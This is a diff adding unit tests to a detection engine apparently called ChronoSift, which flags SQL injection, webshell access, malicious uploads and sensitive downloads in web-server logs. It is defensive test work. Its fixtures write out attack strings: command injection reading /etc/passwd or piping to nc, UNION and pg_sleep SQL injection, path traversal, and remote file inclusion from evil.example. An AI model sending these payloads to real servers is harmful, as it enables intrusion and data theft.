@@ -27,7 +27,7 @@ class ChronoSiftV231RegressionTest(unittest.TestCase):
     def setUp(self):
         self.engine = ChronoSiftEngine.from_yaml(RULES_PATH, WEIGHTS_PATH)
 
-    def _run_referenced_hit_propagation(self, hit_rows, target_rows):
+    def _run_referenced_hit_propagation(self, hit_rows, target_rows, hit_manifest=None):
         all_rows = hit_rows + target_rows
         df = pd.DataFrame(
             all_rows,
@@ -38,7 +38,9 @@ class ChronoSiftV231RegressionTest(unittest.TestCase):
         )
         signal_map = {}
         explain_map = {}
-        self.engine._apply_referenced_file_hit_signals_sparse(df, signal_map, explain_map)
+        self.engine._apply_referenced_file_hit_signals_sparse(
+            df, signal_map, explain_map, hit_manifest=hit_manifest
+        )
         return signal_map, explain_map
 
     def test_new_weights_exist(self):
@@ -54,6 +56,15 @@ class ChronoSiftV231RegressionTest(unittest.TestCase):
             "credential_dump_collection",
             "password_store_exfil_chain",
             "web_upload_execution_chain",
+            "web_sqli_attempt",
+            "web_sqli_response_anomaly",
+            "web_sqli_probable_success",
+            "web_confirmed_webshell_access",
+            "web_external_sensitive_transfer",
+            "mitre_t1190",
+            "mitre_t1505_003",
+            "mitre_t1105",
+            "mitre_t1213_006",
         ):
             self.assertIn(signal_name, self.engine.weights)
 
@@ -349,6 +360,47 @@ class ChronoSiftV231RegressionTest(unittest.TestCase):
         self.assertGreater(float(signal_map[0].get("file_created", 0.0)), 0.0)
         self.assertGreater(float(signal_map[0].get("web_executable_file_created", 0.0)), 0.0)
 
+    def test_partition_contextual_mode_omits_only_zero_weight_generic_lifecycle_payloads(self):
+        ts = pd.to_datetime(["2024-06-16T17:30:00Z", "2024-06-16T17:31:00Z"], utc=True)
+        df = pd.DataFrame([
+            {
+                "parser": "filestat",
+                "timestamp_desc": "Creation Time",
+                "pathspec": "/home/user/ordinary.txt",
+            },
+            {
+                "parser": "filestat",
+                "timestamp_desc": "Creation Time",
+                "pathspec": "/var/www/html/shell.php",
+            },
+        ], index=ts)
+        signal_map = {}
+        explain_map = {}
+
+        self.engine._apply_non_temporal_contextual_sparse(
+            df,
+            signal_map,
+            explain_map,
+            apply_profiling=False,
+            retain_zero_weight_lifecycle_signals=False,
+        )
+
+        self.assertNotIn("file_created", signal_map.get(0, {}))
+        self.assertNotIn("file_created", signal_map.get(1, {}))
+        self.assertEqual(signal_map[1].get("web_executable_file_created"), 1.0)
+        self.assertFalse(any(item.get("rule_id") == "FILE_CREATED" for items in explain_map.values() for item in items))
+
+    def test_contextual_working_arrays_are_reused_without_dataframe_copy(self):
+        ts = pd.to_datetime(["2024-06-16T17:30:00Z"], utc=True)
+        df = pd.DataFrame([{"pathspec": r"C:\Temp\Payload.EXE"}], index=ts)
+        cache = {}
+
+        first = MODULE._contextual_path_lower(df, cache)
+        second = MODULE._contextual_path_lower(df, cache)
+
+        self.assertIs(first, second)
+        self.assertEqual(first[0], "c:/temp/payload.exe")
+
     def test_persistence_config_signals_normalise_parser_and_timestamp_fields_once(self):
         ts = pd.to_datetime(["2024-06-16T17:31:00Z"], utc=True)
         df = pd.DataFrame([{
@@ -539,6 +591,467 @@ class ChronoSiftV231RegressionTest(unittest.TestCase):
         sigs = signal_map.get(1, {})
         self.assertGreater(float(sigs.get("referenced_file_av_hit", 0.0)), 0.0)
 
+    def test_web_path_canonicalisation_decodes_and_removes_query(self):
+        self.assertEqual(
+            MODULE._canonical_web_request_path("/exports/credit%20cards.sql?download=1#top"),
+            "/exports/credit cards.sql",
+        )
+        self.assertEqual(
+            MODULE._web_path_aliases_for_filesystem_path(
+                "/var/www/html/exports/credit cards.sql",
+                ("/var/www/html",),
+            ),
+            ("/exports/credit cards.sql",),
+        )
+
+    def test_strong_yara_gate_uses_score_quality_and_category(self):
+        metadata = {
+            "strong_shell": MODULE.YaraRuleMeta(score=90, quality=80, category=MODULE.YARA_CAT_WEBSHELL),
+            "weak_shell": MODULE.YaraRuleMeta(score=60, quality=80, category=MODULE.YARA_CAT_WEBSHELL),
+            "certificate": MODULE.YaraRuleMeta(score=100, quality=100, category=MODULE.YARA_CAT_CERTIFICATE),
+        }
+        cfg = {"web_yara_min_score": 75, "web_yara_min_quality": 70}
+        self.assertTrue(MODULE._web_relevant_yara_rule_names(["strong_shell"], metadata, cfg))
+        self.assertFalse(MODULE._web_relevant_yara_rule_names(["weak_shell"], metadata, cfg))
+        self.assertFalse(MODULE._web_relevant_yara_rule_names(["certificate"], metadata, cfg))
+
+    def test_manifest_web_aliases_exclude_yara_below_web_gate(self):
+        manifest = MODULE._finalise_referenced_file_hit_manifest(
+            {
+                "/var/www/html/strong.php": {"yara"},
+                "/var/www/html/routine.php": {"yara"},
+                "/var/www/html/cards.csv": {"luhn"},
+            },
+            {},
+            {"/var/www/html/strong.php"},
+            {"web_document_roots": ["/var/www/html"]},
+            {
+                "/var/www/html/strong.php": {
+                    "hit_types": {"yara"},
+                    "yara_rules": {"strong_shell"},
+                    "yara_categories": {MODULE.YARA_CAT_WEBSHELL},
+                    "yara_rule_metadata": {
+                        "strong_shell": {"category": MODULE.YARA_CAT_WEBSHELL, "score": 90, "quality": 80},
+                    },
+                },
+            },
+            {"B" * 64: {"/var/www/html/strong.php"}},
+        )
+        self.assertEqual(manifest["schema_version"], 4)
+        self.assertEqual(manifest["web_path_map"]["/strong.php"], {"yara"})
+        self.assertNotIn("/routine.php", manifest["web_path_map"])
+        self.assertEqual(manifest["web_path_map"]["/cards.csv"], {"luhn"})
+        identity = manifest["web_identity_map"]["/strong.php"]
+        self.assertEqual(identity["yara_categories"], {MODULE.YARA_CAT_WEBSHELL})
+        self.assertEqual(identity["yara_rule_metadata"]["strong_shell"]["quality"], 80)
+        self.assertEqual(manifest["hash_hit_map"]["B" * 64], {"yara"})
+        self.assertEqual(manifest["hash_identity_map"]["B" * 64]["yara_categories"], {MODULE.YARA_CAT_WEBSHELL})
+        round_trip = MODULE._deserialise_file_hit_manifest(
+            MODULE._serialise_file_hit_manifest(manifest)
+        )
+        self.assertEqual(round_trip, manifest)
+
+    def test_successful_web_download_propagates_luhn_file_identity(self):
+        manifest = {
+            "hit_map": {"/var/www/html/includes/sqldump.sql": {"luhn"}},
+            "basename_map": {"sqldump.sql": {"luhn"}},
+            "web_path_map": {"/includes/sqldump.sql": {"luhn"}},
+            "web_basename_map": {"sqldump.sql": {"luhn"}},
+        }
+        target_rows = [{
+            "parser": "text/apache_access",
+            "http_request": "GET /includes/sqldump.sql?download=1 HTTP/1.1",
+            "http_response_code": 200,
+            "http_response_bytes": 24000,
+            "message": "download",
+        }]
+        signal_map, explain_map = self._run_referenced_hit_propagation([], target_rows, manifest)
+        signals = signal_map[0]
+        self.assertGreater(float(signals.get("referenced_file_luhn_hit", 0.0)), 0.0)
+        self.assertEqual(signals.get("web_file_access"), 1.0)
+        self.assertEqual(signals.get("web_sensitive_file_download"), 1.0)
+        evidence = explain_map[0][-1]["evidence"]
+        self.assertEqual(evidence["canonical_web_path"], "/includes/sqldump.sql")
+        self.assertEqual(evidence["http_response_code"], 200)
+
+    def test_failed_web_download_keeps_access_but_not_success_inference(self):
+        manifest = {
+            "hit_map": {},
+            "basename_map": {},
+            "web_path_map": {"/exports/customers.sql": {"luhn"}},
+            "web_basename_map": {"customers.sql": {"luhn"}},
+        }
+        target_rows = [{
+            "parser": "text/nginx_access",
+            "http_request": "GET /exports/customers.sql HTTP/1.1",
+            "http_response_code": 404,
+        }]
+        signal_map, _ = self._run_referenced_hit_propagation([], target_rows, manifest)
+        self.assertEqual(signal_map[0].get("web_file_access"), 1.0)
+        self.assertNotIn("web_sensitive_file_download", signal_map[0])
+
+    def test_web_upload_name_propagates_strong_yara_file_identity(self):
+        manifest = {
+            "hit_map": {},
+            "basename_map": {},
+            "web_path_map": {"/shell.php": {"yara"}},
+            "web_basename_map": {"shell.php": {"yara"}},
+        }
+        target_rows = [{
+            "parser": "text/apache_access",
+            "http_request": "POST /upload.php HTTP/1.1 filename=Shell.php",
+            "http_response_code": 201,
+        }]
+        signal_map, _ = self._run_referenced_hit_propagation([], target_rows, manifest)
+        signals = signal_map[0]
+        self.assertGreater(float(signals.get("referenced_file_yara_hit", 0.0)), 0.0)
+        self.assertEqual(signals.get("web_file_access"), 1.0)
+        self.assertEqual(signals.get("web_malicious_file_upload"), 1.0)
+
+    def test_structured_multipart_metadata_materialises_multiple_uploads(self):
+        ts = pd.to_datetime(["2024-06-16T21:00:00Z"], utc=True)
+        body = (
+            '--x\r\nContent-Disposition: form-data; name="a"; filename="Report final.pdf"\r\n'
+            'Content-Type: application/pdf\r\n\r\n...\r\n'
+            '--x\r\nContent-Disposition: form-data; name="b"; '
+            "filename*=UTF-8''cmd%2Ephp\r\nContent-Type: application/x-httpd-php\r\n"
+        )
+        df = pd.DataFrame([{
+            "parser": "text/apache_access",
+            "http_request": "POST /upload.php HTTP/1.1",
+            "http_headers": "Content-Type: multipart/form-data; boundary=x",
+            "request_body": body,
+            "request_content_length": 12345,
+            "http_response_code": 201,
+        }], index=ts)
+
+        out = self.engine.apply_atomic(df)
+        row = out.iloc[0]
+        self.assertEqual(row["chronosift_web_upload_name"], "cmd.php")
+        self.assertEqual(set(row["chronosift_web_upload_names"].split("|")), {"cmd.php", "report final.pdf"})
+        self.assertEqual(row["chronosift_web_upload_count"], 2)
+        self.assertEqual(row["chronosift_web_request_body_bytes"], 12345)
+        self.assertEqual(row["chronosift_web_upload_outcome"], "accepted")
+        self.assertIn("application/x-httpd-php", row["chronosift_web_upload_content_types"])
+        self.assertIn("executable_upload", row["chronosift_web_attack_indicators"])
+        contextual = self.engine.apply_contextual(out, apply_temporal=False)
+        self.assertEqual(contextual.iloc[0]["chronosift_signals"].get("exploit_public_facing_app"), 1.0)
+
+    def test_upload_hash_correlation_is_preferred_and_t1105_requires_acceptance(self):
+        file_hash = "A" * 64
+        identity = {
+            "hit_types": {"av"},
+            "av_categories": {MODULE.AV_CAT_MALWARE},
+            "av_families": {"ExampleFamily"},
+        }
+        manifest = {
+            "schema_version": 3,
+            "hit_map": {},
+            "basename_map": {},
+            "web_path_map": {},
+            "web_basename_map": {},
+            "hash_hit_map": {file_hash: {"av"}},
+            "hash_identity_map": {file_hash: identity},
+        }
+        ts = pd.to_datetime(["2024-06-16T21:00:00Z", "2024-06-16T21:01:00Z"], utc=True)
+        df = pd.DataFrame([
+            {
+                "parser": "text/apache_access",
+                "http_request": "POST /upload.php HTTP/1.1",
+                "upload_sha256": file_hash.lower(),
+                "http_response_code": 201,
+            },
+            {
+                "parser": "text/apache_access",
+                "http_request": "POST /upload.php HTTP/1.1",
+                "upload_sha256": file_hash.lower(),
+                "http_response_code": 403,
+            },
+        ], index=ts)
+
+        out = self.engine.apply_contextual(
+            self.engine.apply_atomic(df), apply_temporal=False, file_hit_manifest=manifest
+        )
+        accepted = out.iloc[0]
+        rejected = out.iloc[1]
+        self.assertEqual(accepted["chronosift_web_upload_outcome"], "accepted")
+        self.assertEqual(rejected["chronosift_web_upload_outcome"], "rejected")
+        self.assertEqual(accepted["chronosift_signals"].get("web_malicious_file_upload"), 1.0)
+        self.assertEqual(rejected["chronosift_signals"].get("web_malicious_file_upload"), 1.0)
+        self.assertEqual(accepted["chronosift_signals"].get("mitre_t1105"), 1.0)
+        self.assertNotIn("mitre_t1105", rejected["chronosift_signals"])
+        self.assertIn("malware", accepted["chronosift_web_file_categories"])
+
+    def test_web_atomic_rules_scope_on_plaso_parser(self):
+        ts = pd.to_datetime(["2024-06-16T21:00:00Z"], utc=True)
+        df = pd.DataFrame([{
+            "parser": "text/apache_access",
+            "http_request_user_agent": "sqlmap/1.8",
+            "http_response_code": 200,
+            "http_response_bytes": 12000000,
+            "url": "/index.php?id=1",
+        }], index=ts)
+        out = self.engine.apply_atomic(df, materialise_event_columns=True)
+        signals = out.iloc[0]["chronosift_signals"]
+        self.assertEqual(signals.get("offensive_user_agent"), 1.0)
+        self.assertEqual(signals.get("large_http_transfer"), 1.0)
+
+    def test_sqli_detection_decodes_url_encoded_payloads(self):
+        indicators = MODULE._http_sqli_indicators(
+            "/search?id=1%27%20UNION%20ALL%20SELECT%20table_name%20FROM%20information_schema.tables--"
+        )
+        self.assertIn("union_select", indicators)
+        self.assertIn("schema_enumeration", indicators)
+
+    def test_web_indicators_ignore_ordinary_request_syntax(self):
+        # Each of these was flagged before the indicators were tightened: the
+        # query delimiter `&` was treated as a shell separator while `id`/`cat`
+        # counted as command tokens, `+`-decoded prose satisfied the boolean
+        # tautology shape, a lone `%2e` looked like traversal, and any absolute
+        # URL parameter looked like remote file inclusion.
+        for request_path in (
+            "/index.php?option=com_content&view=article&id=5",
+            "/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit",
+            "/media?type=video&id=12&cat=news",
+            "/shop?cat=2&amp;id=7",
+            "/search?q=cats+and+dogs=1",
+            "/report?desc=Q1+revenue+and+cost=projected",
+            "/img/logo%2Epng",
+            "/redirect?url=https://partner.example.com/landing",
+            "/oauth/callback?code=abc&state=xyz",
+        ):
+            self.assertEqual(
+                MODULE._http_attack_indicators(request_path),
+                tuple(),
+                msg=f"benign request flagged: {request_path}",
+            )
+
+    def test_web_indicators_retain_genuine_exploitation_syntax(self):
+        for request_path, expected in (
+            ("/ping?host=127.0.0.1;cat%20/etc/passwd", "command_injection"),
+            ("/ping?host=1%20%26%26%20whoami", "command_injection"),
+            ("/x?y=%60id%60", "command_injection"),
+            ("/x?y=$(uname%20-a)", "command_injection"),
+            ("/x?y=1|nc%2010.0.0.1%204444", "command_injection"),
+            ("/run?c=;/bin/sh", "command_injection"),
+            ("/p?id=1%27%20OR%201=1--", "sqli:boolean_tautology"),
+            ("/p?id=1 and 1=2", "sqli:boolean_tautology"),
+            ("/p?id=a' or 'a'='a", "sqli:boolean_tautology"),
+            # Numeric operand compared against a subquery or function call.
+            ("/p?id=2 and 5577=(select 5577 from pg_sleep(5))--", "sqli:boolean_tautology"),
+            ("/p?id=2 and 1644=cast((chr(113)) as int)", "sqli:boolean_tautology"),
+            ("/p?id=(select concat(0x717a6a7171))", "sqli:inline_subquery"),
+            ("/f?p=%2e%2e%2f%2e%2e%2fetc/passwd", "path_traversal"),
+            ("/f?p=%252e%252e%252fetc", "path_traversal"),
+            ("/fetch?template=http%3A%2F%2Fevil.example%2Fs.php", "remote_file_inclusion"),
+            ("/i?page=http://evil.example/shell.txt", "remote_file_inclusion"),
+        ):
+            self.assertIn(
+                expected,
+                MODULE._http_attack_indicators(request_path),
+                msg=f"missed {expected} in {request_path}",
+            )
+
+    def test_manifest_hash_index_covers_only_hit_carrying_rows(self):
+        # The hash index previously accumulated every hashed row across the
+        # whole dataset even though non-hit hashes are discarded when the
+        # manifest is finalised.
+        manifest = MODULE._finalise_referenced_file_hit_manifest(
+            {"/var/www/html/bad.php": {"av"}},
+            {},
+            set(),
+            {"web_document_roots": ["/var/www/html"]},
+            {"/var/www/html/bad.php": {"hit_types": {"av"}}},
+            {
+                "A" * 64: {"/var/www/html/bad.php"},
+                "C" * 64: {"/var/www/html/clean.php"},
+            },
+        )
+        self.assertEqual(manifest["hash_hit_map"]["A" * 64], {"av"})
+        self.assertNotIn("C" * 64, manifest["hash_hit_map"])
+
+    def test_sqli_probable_success_requires_syntax_success_and_response_anomaly(self):
+        ts = pd.date_range("2024-06-16T21:00:00Z", periods=6, freq="1s")
+        rows = []
+        for response_bytes in (4700, 4720, 4750):
+            rows.append({
+                "parser": "text/apache_access",
+                "http_request": "GET /products?id=1 HTTP/1.1",
+                "http_response_code": 200,
+                "http_response_bytes": response_bytes,
+            })
+        rows.extend([
+            {
+                "parser": "text/apache_access",
+                "http_request": (
+                    "GET /products?id=1%27%20UNION%20SELECT%20table_name%20"
+                    "FROM%20information_schema.tables-- HTTP/1.1"
+                ),
+                "http_response_code": 200,
+                "http_response_bytes": 27000,
+            },
+            {
+                "parser": "text/apache_access",
+                "http_request": "GET /products?id=1%27%20OR%201=1-- HTTP/1.1",
+                "http_response_code": 302,
+                "http_response_bytes": 1,
+            },
+            {
+                "parser": "text/apache_access",
+                "http_request": "GET /download/manual.pdf HTTP/1.1",
+                "http_response_code": 200,
+                "http_response_bytes": 90000,
+            },
+        ])
+        out = self.engine.apply_atomic(
+            pd.DataFrame(rows, index=ts),
+            materialise_event_columns=True,
+        )
+        probable = out.iloc[3]["chronosift_signals"]
+        redirected = out.iloc[4]["chronosift_signals"]
+        large_benign = out.iloc[5]["chronosift_signals"] or {}
+        self.assertEqual(probable.get("web_sqli_attempt"), 1.0)
+        self.assertEqual(probable.get("web_sqli_response_anomaly"), 1.0)
+        self.assertEqual(probable.get("web_sqli_probable_success"), 1.0)
+        self.assertEqual(out.iloc[3]["chronosift_web_method"], "GET")
+        self.assertEqual(out.iloc[3]["chronosift_web_endpoint"], "/products")
+        self.assertIn("sqli:schema_enumeration", out.iloc[3]["chronosift_web_attack_indicators"])
+        self.assertEqual(out.iloc[3]["chronosift_web_outcome"], "probable_success")
+        self.assertEqual(redirected.get("web_sqli_attempt"), 1.0)
+        self.assertNotIn("web_sqli_probable_success", redirected)
+        self.assertNotIn("web_sqli_attempt", large_benign)
+
+    def test_web_identity_and_sqli_receive_evidence_qualified_attack_mappings(self):
+        ts = pd.date_range("2024-06-16T21:10:00Z", periods=6, freq="1s")
+        rows = [
+            {
+                "parser": "text/apache_access",
+                "http_request": "GET /products?id=1 HTTP/1.1",
+                "http_headers": "Host: shop.example",
+                "http_response_code": 200,
+                "http_response_bytes": size,
+                "ip_address": "8.8.8.8",
+            }
+            for size in (4700, 4720, 4750)
+        ]
+        rows.extend([
+            {
+                "parser": "text/apache_access",
+                "http_request": "GET /products?id=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- HTTP/1.1",
+                "http_headers": "Host: shop.example",
+                "http_response_code": 200,
+                "http_response_bytes": 27000,
+                "ip_address": "8.8.8.8",
+            },
+            {
+                "parser": "text/apache_access",
+                "http_request": "GET /shell.php?cmd=id HTTP/1.1",
+                "http_headers": "Host: shop.example",
+                "http_response_code": 200,
+                "http_response_bytes": 200,
+                "ip_address": "8.8.8.8",
+            },
+            {
+                "parser": "text/apache_access",
+                "http_request": "POST /upload.php HTTP/1.1 filename=Shell.php",
+                "http_headers": "Host: shop.example; Content-Type: multipart/form-data; boundary=x",
+                "http_response_code": 201,
+                "http_response_bytes": 20,
+                "ip_address": "8.8.8.8",
+            },
+        ])
+        manifest = {
+            "schema_version": 3,
+            "hit_map": {},
+            "basename_map": {},
+            "web_path_map": {"/shell.php": {"av", "yara"}},
+            "web_basename_map": {"shell.php": {"av", "yara"}},
+            "web_identity_map": {
+                "/shell.php": {
+                    "hit_types": {"av", "yara"},
+                    "av_categories": {MODULE.AV_CAT_WEBSHELL},
+                    "av_families": {"C99shell"},
+                    "yara_categories": {MODULE.YARA_CAT_WEBSHELL},
+                    "yara_rules": {"strong_shell"},
+                    "yara_rule_metadata": {
+                        "strong_shell": {"category": MODULE.YARA_CAT_WEBSHELL, "score": 90, "quality": 80},
+                    },
+                },
+            },
+            "web_basename_identity_map": {
+                "shell.php": {
+                    "hit_types": {"av", "yara"},
+                    "av_categories": {MODULE.AV_CAT_WEBSHELL},
+                    "yara_categories": {MODULE.YARA_CAT_WEBSHELL},
+                },
+            },
+        }
+        out = self.engine.apply_atomic(pd.DataFrame(rows, index=ts))
+        out = self.engine.apply_contextual(
+            out,
+            apply_temporal=False,
+            file_hit_manifest=manifest,
+        )
+
+        sqli = out.iloc[3]
+        shell = out.iloc[4]
+        upload = out.iloc[5]
+        self.assertEqual(sqli["chronosift_signals"].get("mitre_t1190"), 1.0)
+        self.assertEqual(sqli["chronosift_signals"].get("mitre_t1213_006"), 1.0)
+        self.assertEqual(sqli["chronosift_attack_techniques"], "T1190|T1213.006")
+        self.assertEqual(shell["chronosift_signals"].get("web_confirmed_webshell_access"), 1.0)
+        self.assertEqual(shell["chronosift_signals"].get("mitre_t1505_003"), 1.0)
+        self.assertEqual(shell["chronosift_web_file_categories"], "webshell")
+        self.assertEqual(shell["chronosift_web_outcome"], "confirmed_follow_on")
+        self.assertEqual(shell["chronosift_attack_techniques"], "T1505.003")
+        self.assertEqual(upload["chronosift_signals"].get("mitre_t1105"), 1.0)
+        self.assertEqual(upload["chronosift_attack_techniques"], "T1105")
+
+    def test_external_sensitive_download_is_not_overmapped_to_exfiltration(self):
+        ts = pd.to_datetime(["2024-06-16T21:20:00Z"], utc=True)
+        manifest = {
+            "schema_version": 3,
+            "hit_map": {},
+            "basename_map": {},
+            "web_path_map": {"/exports/cards.sql": {"luhn"}},
+            "web_basename_map": {"cards.sql": {"luhn"}},
+            "web_identity_map": {"/exports/cards.sql": {"hit_types": {"luhn"}}},
+            "web_basename_identity_map": {"cards.sql": {"hit_types": {"luhn"}}},
+        }
+        df = pd.DataFrame([{
+            "parser": "text/nginx_access",
+            "http_request": "GET /exports/cards.sql HTTP/1.1",
+            "http_response_code": 200,
+            "http_response_bytes": 100000,
+            "ip_address": "8.8.8.8",
+        }], index=ts)
+        out = self.engine.apply_contextual(
+            self.engine.apply_atomic(df),
+            apply_temporal=False,
+            file_hit_manifest=manifest,
+        )
+        signals = out.iloc[0]["chronosift_signals"]
+        self.assertEqual(signals.get("web_external_sensitive_transfer"), 1.0)
+        self.assertTrue(pd.isna(out.iloc[0]["chronosift_attack_techniques"]))
+
+    def test_normalised_rfi_feature_maps_t1190_without_success_claim(self):
+        ts = pd.to_datetime(["2024-06-16T21:21:00Z"], utc=True)
+        df = pd.DataFrame([{
+            "parser": "text/apache_access",
+            "http_request": "GET /fetch?template=http%3A%2F%2Fevil.example%2Fs.php HTTP/1.1",
+            "http_response_code": 404,
+            "http_response_bytes": 50,
+        }], index=ts)
+        out = self.engine.apply_contextual(
+            self.engine.apply_atomic(df),
+            apply_temporal=False,
+        )
+        row = out.iloc[0]
+        self.assertIn("remote_file_inclusion", row["chronosift_web_attack_indicators"])
+        self.assertEqual(row["chronosift_signals"].get("mitre_t1190"), 1.0)
+        self.assertEqual(row["chronosift_web_outcome"], "attempt")
+        self.assertEqual(row["chronosift_attack_techniques"], "T1190")
+
     def test_json_text_serialisers_preserve_nulls_and_payloads(self):
         nested = pd.DataFrame({
             "chronosift_explain": [None, [{"rule_id": "R1"}]],
@@ -557,6 +1070,73 @@ class ChronoSiftV231RegressionTest(unittest.TestCase):
         self.assertEqual(str(normalised["payload"].dtype), "string")
         self.assertTrue(pd.isna(normalised.iloc[0]["payload"]))
         self.assertEqual(json.loads(normalised.iloc[1]["payload"]), {"alpha": 1})
+
+    def test_stable_arrow_signal_schema_across_heterogeneous_parquet_files(self):
+        first = pd.DataFrame({
+            "chronosift_row_id": [1, 2],
+            "chronosift_signals": [
+                {"archive_created": 1.0},
+                {"web_sqli_attempt": 1.0, "web_sqli_probable_success": 1.0},
+            ],
+            "chronosift_explain": [
+                [{"rule_id": "ARCHIVE", "evidence": {"size": 10}}],
+                [{"rule_id": "SQLI", "evidence": {"indicators": ["union_select"]}}],
+            ],
+        })
+        second = pd.DataFrame({
+            "chronosift_row_id": [3],
+            "chronosift_signals": [{"web_malicious_file_access": 1.0}],
+            "chronosift_explain": [[{
+                "rule_id": "WEB_FILE",
+                "evidence": {"http_response_code": 200, "file_hit_types": "av|yara"},
+            }]],
+        })
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            paths = []
+            for number, frame in enumerate((first, second)):
+                outfile = pathlib.Path(tmpdir) / f"part-{number:05d}.parquet"
+                mode = MODULE._write_parquet_subchunk(
+                    frame,
+                    outfile,
+                    {"engine": "pyarrow", "index": False},
+                    nested_columns_encoding="arrow",
+                )
+                self.assertEqual(mode, "nested")
+                paths.append(str(outfile))
+
+            con = MODULE.duckdb.connect()
+            described = dict(
+                (row[0], row[1])
+                for row in con.execute(
+                    "DESCRIBE SELECT * FROM read_parquet(?, union_by_name=1)",
+                    [paths],
+                ).fetchall()
+            )
+            rows = con.execute(
+                """
+                SELECT
+                    chronosift_row_id,
+                    map_extract_value(chronosift_signals, 'web_sqli_probable_success'),
+                    map_extract_value(chronosift_signals, 'web_malicious_file_access'),
+                    chronosift_explain
+                FROM read_parquet(?, union_by_name=1)
+                ORDER BY chronosift_row_id
+                """,
+                [paths],
+            ).fetchall()
+            loaded = MODULE._duckdb_read_parquet_df(
+                tmpdir,
+                require_datetime=False,
+            ).sort_values("chronosift_row_id")
+
+        self.assertEqual(described["chronosift_signals"], "MAP(VARCHAR, DOUBLE)")
+        self.assertEqual(described["chronosift_explain"], "VARCHAR[]")
+        self.assertEqual(rows[1][1], 1.0)
+        self.assertEqual(rows[2][2], 1.0)
+        self.assertEqual(json.loads(rows[2][3][0])["evidence"]["http_response_code"], 200)
+        self.assertEqual(loaded.iloc[1]["chronosift_signals"]["web_sqli_probable_success"], 1.0)
+        self.assertEqual(loaded.iloc[2]["chronosift_explain"][0]["rule_id"], "WEB_FILE")
 
     def test_normalise_for_parquet_preserves_object_type_coercions(self):
         source = pd.DataFrame({
